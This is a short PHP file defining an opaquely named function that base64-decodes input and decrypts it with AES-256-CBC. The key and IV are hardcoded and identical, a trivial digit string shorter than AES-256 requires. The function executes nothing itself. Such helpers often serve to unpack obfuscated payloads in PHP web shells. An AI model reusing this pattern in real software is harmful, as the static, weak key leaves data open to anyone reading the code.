<?php
function e7061($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed","AES-256-CBC","0123456789011121",0,"0123456789011121");
	return $n;
}
?>
